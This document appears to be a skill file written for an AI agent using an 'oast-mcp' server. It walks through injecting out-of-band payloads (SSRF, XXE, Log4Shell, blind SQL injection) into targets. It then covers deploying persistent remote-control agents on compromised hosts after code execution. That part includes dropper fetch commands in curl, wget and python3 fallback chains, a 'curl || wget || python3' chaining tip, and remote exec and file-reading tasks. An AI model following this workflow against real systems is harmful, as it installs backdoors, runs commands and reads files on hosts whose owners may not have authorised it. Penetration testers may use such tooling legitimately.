---
name: oast-mcp
description: Use when connected to an oast-mcp server and performing out-of-band security testing (SSRF, blind injection, DNS rebinding, Log4Shell) or deploying persistent agents on compromised targets after achieving RCE.
---

# oast-mcp

## Overview

oast-mcp exposes DNS/HTTP/HTTPS callback detection and agent management as MCP tools. Two independent workflows: **OAST** (detect out-of-band interactions) and **Agents** (persistent access after RCE).

Scopes required: `oast:read,oast:write` for OAST tools; `agent:admin` for agent tools.

---

## OAST Workflow

```
oast_create_session → oast_generate_payload → inject into TARGET → oast_wait_for_event → oast_close_session
```

1. **`oast_create_session`** → `session_id` + DNS/HTTP/HTTPS callback endpoints.
   - **Save the `session_id` — use the SAME value in every subsequent call.**
2. **`oast_generate_payload`** (pass the same `session_id`) → ready-to-inject string.
   - `type`: `url`, `xxe`, `ssrf`, `log4j`, `img-tag`, `css-import`, `sqli-oob`
   - `label`: tags the injection point in the subdomain (e.g. `"ua-header"`) — use it to identify which field fired.
3. **Inject** the payload string into the TARGET (e.g. HTTP header, form field, XML parameter).
   - The callback only proves something if the TARGET's server triggers it.
4. **`oast_wait_for_event`** (same `session_id`) — blocks up to 30s for the next callback. Use this immediately after injection.
5. **`oast_list_events`** — returns already-arrived events (history/pagination). Use for review, not real-time detection.
6. **`oast_close_session`** when done.

---

## Agent Workflow

```
probe OS/arch → agent_dropper_generate → run command on target → agent_list → agent_task_schedule → poll agent_task_status
```

1. **Probe** target: `uname -m` (Linux) or `$ENV:PROCESSOR_ARCHITECTURE` (Windows).
2. **`agent_dropper_generate`**: pass `agent_id`, `os_arch`, `ttl`, and `delivery`.
   - `delivery: "url"` — target fetches loader over HTTPS. Returns `curl_cmd`, `wget_cmd`, `python3_cmd`.
   - `delivery: "inline"` — loader embedded as base64 (~200KB). Returns `b64_cmd`, `python3_b64_cmd`. No outbound HTTP needed.
3. **Try commands in fallback order** — assume nothing is installed. Stop at the first that succeeds:

   | Platform | Fallback chain |
   |----------|----------------|
   | Linux url | `curl_cmd` → `wget_cmd` → `python3_cmd` |
   | Linux inline | `b64_cmd` → `python3_b64_cmd` |
   | Windows url | `curl_cmd` (curl.exe built-in since Win10 1803) |
   | Windows inline | `b64_cmd` (pure PowerShell) |

   If a command fails with "command not found" or "not recognized" → next fallback immediately.
   If all URL fallbacks fail → call `agent_dropper_generate` again with `delivery: "inline"`.

4. **`agent_list`** — confirm `status: "online"` before scheduling. The agent token `--sub` must match the MCP session subject (same tenant).
5. **`agent_task_schedule`** → returns `task_id` immediately (async).
6. **Poll `agent_task_status`** every 3s until `status` is `done` or `error`.

## Capability Reference

| Capability    | Params                                    | Result fields                    |
|---------------|-------------------------------------------|----------------------------------|
| `exec`        | `cmd` (str), `timeout` (int, default 30)  | `output` (str), `exit_code` (int)|
| `read_file`   | `path` (str)                              | `content` (**base64**), `path`   |
| `fetch_url`   | `url` (str), `timeout` (int, default 15)  | `status` (int), `body` (**base64**)|
| `system_info` | —                                         | `hostname`, `os`, `arch`, `user` |

`read_file` and `fetch_url` results are base64-encoded — decode before interpreting content.

---

## Common Mistakes

| Mistake | Fix |
|---------|-----|
| `agent_list` returns empty after running dropper | Token `--sub` must equal the MCP session subject; different subjects = different tenants |
| Task stuck in `pending` | Confirm agent is `online` first; dispatch loop polls every 2s |
| Polling `oast_list_events` in a loop after injection | Use `oast_wait_for_event` — it blocks server-side; `list_events` returns history only |
| `oast_wait_for_event` always times out | (1) Verify payload was injected into the target, not just fetched locally; (2) confirm `session_id` matches the one from `oast_create_session` — a stale or different ID means events route to a different session |
| Curling the callback URL yourself to "verify" | Don't. Self-fetching proves nothing — only the TARGET triggering the payload is a valid callback |
| Using a payload URL from a previous/different session | Always call `oast_generate_payload` with the current `session_id`; never reuse callback hostnames from old sessions |
| `curl: command not found` | Try `wget_cmd`, then `python3_cmd`; fall back to `delivery: "inline"` if all fail. |
| Or no callback or effect when trying blind injections | Try to use multiple commands with the `or` operator (e.g., `curl xxx \|\| wget -Oyyy xxxx \|\| python3 xxxx` )  | 
| `base64: command not found` | Use `python3_b64_cmd` instead of `b64_cmd` |
| Target is air-gapped, no outbound HTTP | Set `delivery: "inline"` in `agent_dropper_generate` |
| `read_file`/`fetch_url` content unreadable | The `content`/`body` field is base64 — decode it |
